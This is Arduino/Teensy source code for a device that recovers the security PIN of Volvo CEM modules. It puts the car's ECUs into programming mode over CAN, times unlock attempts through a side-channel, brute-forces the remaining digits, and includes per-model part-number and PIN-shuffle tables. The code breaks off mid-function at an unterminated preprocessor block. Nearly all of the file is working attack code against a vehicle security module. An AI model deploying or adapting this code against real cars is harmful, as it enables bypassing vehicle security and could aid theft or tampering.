
/* tunable parameters */
//#define P3
#define SAMPLES samp
#define CALC_BYTES nobytes /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */
#define CEM_PN_AUTODETECT  /* comment out for P2 CEM-L on the bench w/o DIM */
#define LAT_ONLY
/* Button define */

#define UPPER_BUTTON 5
#define LOWER_BUTTON 4

//#define  DUMP_BUCKETS                               /* dump all buckets for debugging */

/* end of tunable parameters */
#include <Arduino.h>
#include <stdio.h>
#include <FlexCAN_T4.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

// Declaration for an SSD1306 display connected to I2C (SDA, SCL pins)

#define SCREEN_WIDTH 128 // OLED display width, in pixels
#define SCREEN_HEIGHT 64 // OLED display height, in pixels

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

#if !defined(__IMXRT1062__)
#error Unsupported Teensy model, need 4.0
#endif
// the number of the pushbutton pin
uint32_t samp = 30;
int nobytes = 3;
int p2 = 0;
uint32_t cem_reply_min;
uint32_t cem_reply_avg;
uint32_t cem_reply_max;

bool p3 = false;
bool lat = true;

#define AVERAGE_DELTA_MIN -8 /* buckets to look at before the rolling average */
#define AVERAGE_DELTA_MAX 12 /* buckets to look at after the rolling average  */

#define CAN_L_PIN 2 /* CAN Rx pin connected to digital pin 2 */

#define CAN_500KBPS 500000 /* 500 Kbit speed */
#define CAN_250KBPS 250000 /* 250 Kbit speed */
#define CAN_125KBPS 125000 /* 125 Kbit speed */

FlexCAN_T4<CAN1, RX_SIZE_256, TX_SIZE_16> can_hs;
FlexCAN_T4<CAN2, RX_SIZE_256, TX_SIZE_16> can_ls;

typedef enum
{
  CAN_HS, /* high-speed bus */
  CAN_LS  /* low-speed bus */
} can_bus_id_t;

/* use the ARM cycle counter as the time-stamp */

#define TSC ARM_DWT_CYCCNT

#define printf Serial.printf

#define CAN_MSG_SIZE 8 /* messages are always 8 bytes */

#define CEM_HS_ECU_ID 0x50
#define CEM_LS_ECU_ID 0x40

#define PIN_LEN 6 /* a PIN has 6 bytes */

/*SPLASH SCREEN LOGO*/

const unsigned char logo[] PROGMEM = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x84, 0x20,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x85, 0x20,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x85, 0xe8,
    0x00, 0x00, 0x00, 0x00, 0x02, 0x02, 0x1f, 0x02, 0x04, 0x04, 0x3e, 0x00, 0x00, 0x10, 0x85, 0xf8,
    0x00, 0x00, 0x00, 0x00, 0x02, 0x06, 0x31, 0x82, 0x04, 0x0c, 0x63, 0x00, 0x00, 0x10, 0xc7, 0xfc,
    0x00, 0x00, 0x00, 0x00, 0x03, 0x04, 0x60, 0xc2, 0x06, 0x08, 0xc1, 0x80, 0x00, 0x18, 0x47, 0xfc,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x04, 0x40, 0x42, 0x02, 0x08, 0x80, 0x80, 0x00, 0x18, 0x47, 0xf8,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x0c, 0xc0, 0x42, 0x02, 0x11, 0x80, 0xc0, 0x00, 0x18, 0x6f, 0xf8,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x88, 0xc0, 0x42, 0x03, 0x11, 0x80, 0xc0, 0x00, 0x08, 0x7f, 0xf0,
    0x00, 0x30, 0x00, 0x00, 0x00, 0x98, 0xc0, 0x62, 0x03, 0x31, 0x80, 0xc0, 0x00, 0x0c, 0x7f, 0xe0,
    0x00, 0x3c, 0x00, 0x00, 0x00, 0x98, 0xc0, 0x42, 0x01, 0x31, 0x80, 0xc0, 0x00, 0x0c, 0x7c, 0x00,
    0x00, 0x3f, 0x00, 0x00, 0x00, 0xd0, 0x40, 0x42, 0x01, 0xa0, 0x80, 0x80, 0x00, 0x07, 0xe0, 0x00,
    0x00, 0x37, 0x00, 0x00, 0x00, 0x50, 0x60, 0xc2, 0x00, 0xa0, 0xc1, 0x80, 0x00, 0x1f, 0x80, 0x00,
    0x00, 0x33, 0x00, 0x00, 0x00, 0x60, 0x31, 0x82, 0x00, 0xc0, 0x63, 0x00, 0x03, 0xff, 0x00, 0x00,
    0x00, 0x36, 0x00, 0x00, 0x00, 0x60, 0x1f, 0x03, 0xf8, 0xc0, 0x3e, 0x00, 0x07, 0xff, 0x80, 0x00,
    0x00, 0x66, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0xff, 0x80, 0x00,
    0x00, 0x66, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0xff, 0x80, 0x00,
    0x00, 0x6c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0xff, 0xc0, 0x00,
    0x00, 0x6c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xff, 0xc0, 0x00,
    0x00, 0xee, 0x01, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7f, 0xc0, 0x00,
    0x01, 0xc7, 0xff, 0xff, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xf0, 0x00,
    0x01, 0xc3, 0xff, 0xf8, 0x07, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1c, 0x1f, 0xfc, 0x00,
    0x01, 0xc4, 0x00, 0x00, 0x05, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x1f, 0xfe, 0x00,
    0x01, 0xc4, 0x00, 0x00, 0x05, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xbf, 0xfe, 0x00,
    0x01, 0xc4, 0x00, 0x00, 0x05, 0x80, 0x1e, 0x01, 0x01, 0x82, 0x00, 0x00, 0x7f, 0xff, 0xfe, 0x00,
    0x00, 0xc7, 0xff, 0xfc, 0x07, 0x80, 0x63, 0x03, 0x83, 0x82, 0x00, 0x00, 0x67, 0xff, 0xfe, 0x00,
    0x00, 0xcf, 0xff, 0xff, 0xff, 0x80, 0x41, 0x83, 0x83, 0xc2, 0x00, 0x00, 0x63, 0xff, 0xff, 0x00,
    0x00, 0x6c, 0x00, 0x7f, 0xff, 0x00, 0xc0, 0x06, 0x83, 0x42, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00,
    0x00, 0x6c, 0x00, 0xf7, 0x00, 0x00, 0xc0, 0x04, 0xc3, 0x62, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00,
    0x00, 0x6c, 0x00, 0x97, 0x00, 0x00, 0xc0, 0x04, 0x43, 0x32, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00,
    0x00, 0xfc, 0x00, 0x7f, 0x00, 0x00, 0xc0, 0x0c, 0x43, 0x32, 0x00, 0x00, 0xe3, 0xff, 0xff, 0x80,
    0x03, 0xfc, 0x00, 0x1b, 0x00, 0x00, 0xc0, 0x0c, 0x63, 0x1a, 0x00, 0x01, 0xf1, 0xff, 0xff, 0xc0,
    0x07, 0x3c, 0x10, 0x3f, 0x00, 0x00, 0xc0, 0x0f, 0xe3, 0x0a, 0x00, 0x01, 0xb0, 0xff, 0xff, 0xf0,
    0x0e, 0x3c, 0x10, 0x3f, 0x00, 0x00, 0x40, 0x98, 0x23, 0x0e, 0x00, 0x00, 0x30, 0x1f, 0xff, 0xf8,
    0x1c, 0x1c, 0x10, 0xde, 0x00, 0x00, 0x73, 0x18, 0x33, 0x06, 0x00, 0x00, 0x18, 0x1f, 0xff, 0xf8,
    0x38, 0x1c, 0x00, 0xca, 0x00, 0x00, 0x3f, 0x10, 0x11, 0x06, 0x00, 0x00, 0x18, 0x0f, 0xff, 0xfc,
    0x70, 0x1c, 0x01, 0xfa, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1c, 0x0f, 0xff, 0xfe,
    0xe3, 0x8e, 0x03, 0xfa, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0e, 0x07, 0xff, 0xfe,
    0xe0, 0x3e, 0x04, 0xea, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x01, 0xff, 0xfe,
    0xfe, 0x0e, 0x0f, 0xac, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7f, 0xff,
    0xdb, 0x00, 0x1f, 0xa8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7f, 0xff,
    0xd9, 0x98, 0x2f, 0xa0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
    0x78, 0xc0, 0x65, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7f, 0xff,
    0x7f, 0xc0, 0xfd, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7f, 0xff,
    0x3f, 0xc1, 0xfd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7f, 0xfe,
    0x11, 0xc2, 0x7d, 0x07, 0xc1, 0xf8, 0x0c, 0x03, 0xe1, 0x02, 0x3f, 0xc7, 0xf0, 0x00, 0x3f, 0xfe,
    0x01, 0xc7, 0xfe, 0x0c, 0x61, 0x0c, 0x0c, 0x06, 0x31, 0x84, 0x30, 0x04, 0x18, 0x00, 0x1f, 0xf8,
    0x01, 0xef, 0xf4, 0x18, 0x31, 0x06, 0x0a, 0x0c, 0x11, 0x8c, 0x30, 0x04, 0x08, 0x70, 0x0f, 0xf0,
    0x01, 0x97, 0xf0, 0x10, 0x01, 0x06, 0x12, 0x08, 0x01, 0x98, 0x30, 0x04, 0x08, 0x7f, 0xff, 0xe0,
    0x01, 0xd6, 0xb0, 0x10, 0x01, 0x06, 0x13, 0x18, 0x01, 0xb0, 0x30, 0x04, 0x08, 0x37, 0xff, 0xc0,
    0x00, 0xfe, 0xa0, 0x10, 0x01, 0x0c, 0x33, 0x18, 0x01, 0xf8, 0x3f, 0x86, 0x10, 0x00, 0x3d, 0xc0,
    0x00, 0x7e, 0x80, 0x10, 0x01, 0xf8, 0x31, 0x18, 0x01, 0xc8, 0x30, 0x07, 0xe0, 0x00, 0x00, 0xe0,
    0x00, 0x3a, 0x80, 0x10, 0x01, 0x10, 0x3f, 0x18, 0x01, 0x8c, 0x30, 0x04, 0x60, 0x00, 0x00, 0xe0,
    0x00, 0x33, 0x00, 0x10, 0x01, 0x18, 0x3f, 0x88, 0x01, 0x84, 0x30, 0x04, 0x20, 0x00, 0x00, 0xe0,
    0x00, 0x02, 0x00, 0x18, 0x31, 0x0c, 0x40, 0x8c, 0x11, 0x86, 0x30, 0x04, 0x30, 0x00, 0x03, 0x80,
    0x00, 0x00, 0x00, 0x0c, 0x61, 0x04, 0x40, 0xc6, 0x31, 0x83, 0x30, 0x04, 0x18, 0x00, 0x07, 0x00,
    0x00, 0x00, 0x00, 0x07, 0xc1, 0x02, 0x40, 0x43, 0xe0, 0x01, 0x1f, 0xc4, 0x08, 0x00, 0x0e, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1c, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3c, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x38, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00};

unsigned char shuffle_orders[4][PIN_LEN] = {{0, 1, 2, 3, 4, 5}, {3, 1, 5, 0, 2, 4}, {5, 2, 1, 4, 0, 3}, {2, 4, 5, 0, 3, 1}};

unsigned char *shuffle_order;

struct _cem_params
{
  unsigned long part_number;
  int baud;
  int shuffle;
} cem_params[] = {
    // P1
    {8690719, CAN_500KBPS, 0},
    {8690720, CAN_500KBPS, 0},
    {8690721, CAN_500KBPS, 0},
    {8690722, CAN_500KBPS, 0},
    {30765471, CAN_500KBPS, 0},
    {30728906, CAN_500KBPS, 0},
    {30765015, CAN_500KBPS, 0},
    {31254317, CAN_500KBPS, 0},
    {31327215, CAN_500KBPS, 3},
    {31254749, CAN_500KBPS, 3},
    {31254903, CAN_500KBPS, 0},
    {31296881, CAN_500KBPS, 0},

    // P2 CEM-B (Brick shaped 1999-2004 with K-line)
    {8645716, CAN_250KBPS, 0},
    {8645719, CAN_250KBPS, 0},
    {8688434, CAN_250KBPS, 0},
    {8688436, CAN_250KBPS, 0},
    {8688513, CAN_250KBPS, 2},
    {30657629, CAN_250KBPS, 0},
    {9494336, CAN_250KBPS, 0},
    {9494594, CAN_250KBPS, 0},
    {8645171, CAN_250KBPS, 0},
    {9452553, CAN_250KBPS, 0},
    {8645205, CAN_250KBPS, 0},
    {9452596, CAN_250KBPS, 0},
    {8602436, CAN_250KBPS, 0},
    {9469809, CAN_250KBPS, 0},
    {8645200, CAN_250KBPS, 0},

    // P2 CEM-L (L shaped and marked L 2005-2014)
    {30682981, CAN_500KBPS, 1},
    {30682982, CAN_500KBPS, 1},
    {30728356, CAN_500KBPS, 1},
    {30728542, CAN_500KBPS, 1},
    {30765149, CAN_500KBPS, 1},
    {30765646, CAN_500KBPS, 1},
    {30786475, CAN_500KBPS, 1},
    {30786889, CAN_500KBPS, 1},
    {31282457, CAN_500KBPS, 1},
    {31314468, CAN_500KBPS, 1},
    {31394158, CAN_500KBPS, 1},

    // P2 CEM-H (L shaped and marked H 2005 - 2007)
    {30786476, CAN_500KBPS, 1},
    {30728539, CAN_500KBPS, 1},
    {30682982, CAN_500KBPS, 1},
    {30728357, CAN_500KBPS, 1},
    {30765148, CAN_500KBPS, 1},
    {30765643, CAN_500KBPS, 1},
    {30786476, CAN_500KBPS, 1},
    {30786890, CAN_500KBPS, 1},
    {30795115, CAN_500KBPS, 1},
    {31282455, CAN_500KBPS, 1},
    {31394157, CAN_500KBPS, 1},
    {30786579, CAN_500KBPS, 1},
};

/* measured latencies are stored for each of possible value of a single PIN digit */

typedef struct seq
{
  uint8_t pinValue; /* value used for the PIN digit */
  uint32_t latency; /* measured latency */
  double std;
} sequence_t;

sequence_t sequence[100] = {0};

/* Teensy function to set the core's clock rate */

extern "C" uint32_t set_arm_clock(uint32_t freq);

/* forward declarations */

/*******************************************************************************
 *
 *
 *  Loading Bar when bruteforce is running
 *
 *
 */

void drawPercentbar(int x, int y, int width, int height, int progress)
{
  progress = progress > 100 ? 100 : progress;
  progress = progress < 0 ? 0 : progress;
  float bar = ((float)(width - 4) / 100) * progress;
  display.drawRect(x, y, width, height, WHITE);
  display.fillRect(x + 2, y + 2, bar, height - 4, WHITE);
  // Display progress text
  if (height >= 15)
  {
    display.setCursor((width / 2) - 3, y + 5);
    display.setTextSize(1);
    display.setTextColor(WHITE);
    if (progress >= 50)
      display.setTextColor(BLACK, WHITE); // 'inverted' text
    display.print(progress);
    display.print("%");
  }
}

bool cemUnlock(uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose);

/*******************************************************************************
 *
 * canMsgSend - send message on the CAN bus (FlexCAN_T4 version)
 *
 * Returns: N/A
 */

int canMsgSend(can_bus_id_t bus, bool ext, uint32_t id, uint8_t *data, bool verbose)
{
  CAN_message_t msg;
  int ret;

  if (verbose == true)
  {
    printf("CAN_%cS ---> ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
           bus == CAN_HS ? 'H' : 'L',
           id, data[0], data[1], data[2], data[3], data[4], data[5], data[6], data[7]);
  }

  /* prepare the message to transmit */

  msg.id = id;
  msg.len = 8;
  msg.flags.extended = ext;
  memcpy(msg.buf, data, 8);

  /* send it to the appropriate bus */

  switch (bus)
  {
  case CAN_HS:
    ret = can_hs.write(msg);
    break;
  case CAN_LS:
    ret = can_ls.write(msg);
    break;
  default:
    ret = 0;
    break;
  }
  return ret;
}

CAN_message_t can_hs_event_msg;
CAN_message_t can_ls_event_msg;
volatile bool can_hs_event_msg_available = false;
volatile bool can_ls_event_msg_available = false;

/*******************************************************************************
 *
 * canMsgReceive - receive a CAN bus message
 *
 * Note: always processes messages from the high-speed bus
 *
 * Returns: true if a message was available, false otherwise
 */

bool canMsgReceive(can_bus_id_t bus, uint32_t *id, uint8_t *data, int wait, bool verbose)
{
  uint8_t *pData;
  uint32_t canId = 0;
  bool ret = false;
  volatile bool &msg_avail = (bus == CAN_HS ? can_hs_event_msg_available : can_ls_event_msg_available);
  CAN_message_t &msg = (bus == CAN_HS ? can_hs_event_msg : can_ls_event_msg);
  uint64_t start = TSC;
  uint64_t end = start + wait * 1000 * clockCyclesPerMicrosecond();
  int _wait = wait;

  do
  {

    /* call FlexCAN_T4's event handler to process queued messages */

    bus == CAN_HS ? can_hs.events() : can_ls.events();

    /* check if a message was available and process it */

    if (msg_avail)
    {

      /* process the global buffer set by can_hs.events */

      msg_avail = false;
      canId = msg.id;
      pData = msg.buf;
      ret = true;
    }
    else
    {
      _wait = TSC < end;
    }
  } while (!ret && _wait);

  /* no message, just return an error */

  if (!ret)
  {
    uint64_t now = TSC;
    wait &&printf("canMsgReceive timed out, start %llu, now %llu, diff %u\n", start, now, now - start);
    return ret;
  }
  /* save data to the caller if they provided buffers */

  if (id)
    *id = canId;

  if (data)
    memcpy(data, pData, CAN_MSG_SIZE);

  /* print the message we received */

  if (verbose)
  {
    printf("CAN_%cS <--- ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
           bus == CAN_HS ? 'H' : 'L',
           canId, pData[0], pData[1], pData[2], pData[3], pData[4], pData[5], pData[6], pData[7]);
  }

  return ret;
}
/*******************************************************************************
 *
 * binToBcd - convert an 8-bit value to a binary coded decimal value
 *
 * Returns: converted 8-bit BCD value
 */

uint8_t binToBcd(uint8_t value)
{
  return ((value / 10) << 4) | (value % 10);
}

/*******************************************************************************
 *
 * bcdToBin - convert a binary coded decimal value to an 8-bit value
 *
 * Returns: converted 8-bit binary value
 */

uint8_t bcdToBin(uint8_t value)
{
  return ((value >> 4) * 10) + (value & 0xf);
}

/*******************************************************************************
 *
 * profileCemResponse - profile the CEM's response to PIN requests
 *
 * Returns: number of PINs processed per second
 */

uint32_t profileCemResponse(void)
{
  uint8_t pin[PIN_LEN] = {0};
  uint32_t start;
  uint32_t end;
  uint32_t latency;
  uint32_t rate;
  bool verbose = false;
  uint32_t i;

  cem_reply_avg = 0;

  /* start time in milliseconds */

  start = millis();

  /* collect the samples */

  for (i = 0; i < 1000; i++)
  {

    /* average calculation is more reliable using random PIN digits */

    for (int j = 0; j < PIN_LEN; j++)
      pin[j] = binToBcd(random(0, 99));

    /* try and unlock the CEM with the random PIN */

    cemUnlock(pin, NULL, &latency, verbose);

    /* keep a running total of the average latency */

    cem_reply_avg += latency / clockCyclesPerMicrosecond();
  }

  /* end time in milliseconds */

  end = millis();

  /* calculate the average latency for a single response */

  cem_reply_avg /= 1000;

  cem_reply_min = cem_reply_avg / 2;
  cem_reply_max = cem_reply_avg + cem_reply_min;

  /* number of PINs processed per second */

  rate = 1e6 / (end - start);

  printf("1000 pins in %u ms, %u pins/s, average response: %u us, histogram %u to %u us \n", (end - start), rate, cem_reply_avg, cem_reply_min, cem_reply_max);
  return rate;
}

volatile bool intr;

/*******************************************************************************
 *
 * cemUnlock - attempt to unlock the CEM with the provided PIN
 *
 * Returns: true if the CEM was unlocked, false otherwise
 */

bool cemUnlock(uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
{
  uint8_t unlockMsg[CAN_MSG_SIZE] = {CEM_HS_ECU_ID, 0xBE};
  uint8_t reply[CAN_MSG_SIZE];
  uint8_t *pMsgPin = unlockMsg + 2;
  uint32_t start, end, limit;
  uint32_t id;
  uint32_t maxTime = 0;

  /* shuffle the PIN and set it in the request message */

  for (int i = 0; i < PIN_LEN; i++)
    pMsgPin[shuffle_order[i]] = pin[i];

  /* maximum time to collect our samples */

  limit = TSC + 2 * 1000 * clockCyclesPerMicrosecond();
  intr = false;

  /* send the unlock request */
  canMsgSend(CAN_HS, true, 0xffffe, unlockMsg, verbose);

  start = end = TSC;
  while (!intr && TSC < limit)
  {
    /* if the line is high, the CAN bus is either idle or transmitting a bit */

    if (digitalRead(CAN_L_PIN))
      continue;

    /* the CAN bus isn't idle, it's the start of the next bit */

    end = TSC;

    /* we only need to track the longest time we've seen */

    if (end - start > maxTime)
      maxTime = end - start;
    /* start of the next sample */

    start = end;
  }

  /* default reply is set to indicate a failure */

  memset(reply, 0xff, sizeof(reply));

  /* see if anything came back from the CEM */

  canMsgReceive(CAN_HS, &id, reply, 1000, false);

  /* return the maximum time between transmissions that we saw on the CAN bus */

  if (latency)
    *latency = maxTime;

  /* return PIN used if the caller wants it */

  if (pinUsed != NULL)
  {
    memcpy(pinUsed, pMsgPin, PIN_LEN);
  }

  /* a reply of 0x00 indicates CEM was unlocked */

  return reply[2] == 0x00;
}

unsigned long ecu_read_part_number(can_bus_id_t bus, unsigned char id)
{
  uint32_t _id;
  uint8_t data[CAN_MSG_SIZE] = {0xcb, id, 0xb9, 0xf0, 0x00, 0x00, 0x00, 0x00};
  uint8_t rcv[CAN_MSG_SIZE];
  bool verbose = true;
  unsigned long pn = 0;
  int ret;
  int i, j = 0;
  int frame;

  printf("Reading part number from ECU 0x%02x on CAN_%cS\n", id, bus == CAN_HS ? 'H' : 'L');
yet_again:
  canMsgSend(bus, true, 0xffffe, data, verbose);
  i = 0;
  j++;
  frame = 0;
  if (j > 10)
    return 0;
  do
  {
  again:
    i++;
    if (i > 20)
      goto yet_again;

    ret = canMsgReceive(bus, &_id, rcv, 10, true);
    if (!ret)
      goto again;
    _id &= 0xffff;
    if (bus == CAN_HS && _id != 0x0003UL)
      goto again;
    if (bus == CAN_LS && _id != 0x0003UL && _id != 0x0005UL)
      goto again;
    i = 0;
    if (frame == 0 && rcv[0] & 0x80)
    {
      pn *= 100;
      pn += bcdToBin(rcv[5]);
      pn *= 100;
      pn += bcdToBin(rcv[6]);
      pn *= 100;
      pn += bcdToBin(rcv[7]);
      frame++;
    }
    else if (frame == 1 && !(rcv[0] & 0x40))
    {
      pn *= 100;
      pn += bcdToBin(rcv[1]);
      frame++;
    }
  } while (frame < 2);

  printf("Part Number: %lu\n", pn);
  return pn;
}

unsigned long ecu_read_part_number_prog(can_bus_id_t bus, unsigned char id)
{
  uint32_t _id;
  uint8_t data[CAN_MSG_SIZE] = {id, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  bool verbose = true;
  unsigned long pn = 0;

  printf("Reading part number from ECU 0x%02x on CAN_%cS\n", id, bus == CAN_HS ? 'H' : 'L');

  canMsgSend(bus, true, 0xffffe, data, verbose);
  canMsgReceive(bus, &_id, data, 1000, verbose);

  for (int i = 0; i < 6; i++)
  {
    pn *= 100;
    pn += bcdToBin(data[2 + i]);
  }

  printf("Part Number: %lu\n", pn);
  return pn;
}

void k_line_keep_alive()
{
  unsigned char msg[] = {0x84, 0x40, 0x13, 0xb2, 0xf0, 0x03, 0x7c};

  Serial3.write(msg, sizeof(msg));
}
/*******************************************************************************
 *
 * progModeOn - put all ECUs into programming mode
 *
 * Returns: N/A
 */

void can_prog_mode()
{
  uint8_t datap3[CAN_MSG_SIZE] = {0x02, 0x10, 0x82, 0x00, 0x00, 0x00, 0x00, 0x00};
  uint8_t datap2[CAN_MSG_SIZE] = {0xFF, 0x86, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

  uint32_t time = 5000;
  uint32_t delayTime = 5;
  bool verbose = true;

  printf("Putting all ECUs into programming mode.\n");
  printf("\n === CEM-on-the-bench users: you have %d seconds to apply CEM power! ===\n\n", time / 1000);

  while (canMsgReceive(CAN_HS, NULL, NULL, 1, false))
    ;

  /* broadcast a series of PROG mode requests */

  while (time > 0)
  {
    if ((time % 1000) == 0)
      k_line_keep_alive();

    if (p3)
    {
      canMsgSend(CAN_HS, false, 0x7df, datap3, verbose);
      canMsgSend(CAN_LS, false, 0x7df, datap3, verbose);
    }

    else
    {
      canMsgSend(CAN_HS, true, 0xffffe, datap2, verbose);
      canMsgSend(CAN_LS, true, 0xffffe, datap2, verbose);
    }
    verbose = false;
    time -= delayTime;
    delay(delayTime);
  }
  while (canMsgReceive(CAN_HS, NULL, NULL, 1, false))
    ;
}

/*******************************************************************************
 *
 * progModeOff - reset all ECUs to get them out of programming mode
 *
 * Returns: N/A
 */

void progModeOff(void)
{
  uint8_t data[CAN_MSG_SIZE] = {0xFF, 0xc8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  bool verbose = true;

  printf("Resetting all ECUs.\n");

  /* broadcast a series of reset requests */

  for (uint32_t i = 0; i < 50; i++)
  {
    canMsgSend(CAN_HS, true, 0xffffe, data, verbose);
    canMsgSend(CAN_LS, true, 0xffffe, data, verbose);

    verbose = false;
    delay(100);
  }
}

int seq_max_lat(const void *a, const void *b)
{
  sequence_t *_a = (sequence_t *)a;
  sequence_t *_b = (sequence_t *)b;

  return _b->latency - _a->latency;
}

int seq_max_std(const void *a, const void *b)
{
  sequence_t *_a = (sequence_t *)a;
  sequence_t *_b = (sequence_t *)b;

  return (int)(100 * _b->std) - (int)(100 * _a->std);
}

/*******************************************************************************
 *
 * crackPinPosition - attempt to find a specific digit in the PIN
 *
 * Returns: N/A
 */

void crackPinPosition(uint8_t *pin, uint32_t pos, bool verbose)
{
  int len = sizeof(uint32_t) * (cem_reply_max - cem_reply_min);
  uint32_t *histogram = (uint32_t *)malloc(len);
  uint32_t latency;
  uint32_t prod;
  uint32_t sum;
  double std;
  uint8_t pin1, pin2;
  uint32_t i;
  uint32_t k;
  uint32_t xmin = cem_reply_avg + AVERAGE_DELTA_MIN;
  uint32_t xmax = cem_reply_avg + AVERAGE_DELTA_MAX;

  /* clear collected latencies */

  memset(sequence, 0, sizeof(sequence));

  printf("                   us: ");
  for (i = xmin; i < xmax; i++)
    printf("%5d ", i);
  printf("\n");

  /* iterate over all possible values for the PIN digit */

  for (pin1 = 0; pin1 < 100; pin1++)
  {
    /* set PIN digit */

    pin[pos] = binToBcd(pin1);

    /* print a progress message for each PIN digit we're processing */

    printf("[ ");

    /* show numerial values for the known digits */
    display.setCursor(0, 30);
    display.fillRect(0, 30, 64, 8, BLACK);
    display.setTextSize(1);
    for (i = 0; i <= pos; i++)
    {
      char ptd[20];
      sprintf(ptd, " %02x ", pin[i]);
      display.print(ptd);
      printf("%02x ", pin[i]);
    }

    /* placeholder for the unknown digits */

    while (i < PIN_LEN)
    {
      printf("-- ");
      i++;
    }
    printf("]: ");
    display.display();

    /* clear histogram data for the new PIN digit */

    memset(histogram, 0, len);

    /* iterate over all possible values for the adjacent PIN digit */

    for (pin2 = 0; pin2 < 100; pin2++)
    {

      /* set PIN digit */

      pin[pos + 1] = binToBcd(pin2);

      /* collect latency measurements the PIN pair */

      for (uint32_t j = 0; j < SAMPLES; j++)
      {

        /* iterate the next PIN digit (third digit) */

        pin[pos + 2] = binToBcd((uint8_t)j);

        /* try and unlock and measure the latency */

        cemUnlock(pin, NULL, &latency, verbose);

        /* calculate the index into the historgram */

        uint32_t idx = latency / clockCyclesPerMicrosecond();

        if (idx < cem_reply_min)
          idx = cem_reply_min;

        if (idx >= cem_reply_max)
          idx = cem_reply_max - 1;

        idx -= cem_reply_min;
        /* bump the count for this latency */

        histogram[idx]++;
      }
    }

    /* clear the digits we just used for latency iteration */

    pin[pos + 1] = 0;
    pin[pos + 2] = 0;
    pin[pos + 3] = 0;

    /* clear statistical values we're calculating */

    prod = 0;
    sum = 0;

    /* loop over the histogram values */

    for (k = xmin; k < xmax; k++)
      printf("% 5u ", histogram[k - cem_reply_min]);

    for (k = cem_reply_min; k < cem_reply_max; k++)
    {
      int l = k - cem_reply_min;
      uint32_t h = histogram[l];

      if (h)
      {
        prod += h * k;
        sum += h;
      }
    }

    int mean = sum / (xmax - xmin);
    long x = 0;

    for (unsigned int k = cem_reply_min; k < cem_reply_max; k++)
    {
      int l = k - cem_reply_min;
      if (histogram[l])
        x += sq(histogram[l] - mean);
    }
    std = sqrt((double)x / (cem_reply_max - cem_reply_min));

    /* weighted average */

    printf(": latency % 10u; std %3.2f\n", prod, std);

    /* store the weighted average count for this PIN value */

    sequence[pin1].pinValue = pin[pos];
    sequence[pin1].latency = prod;
    sequence[pin1].std = std;

#if defined(DUMP_BUCKETS)
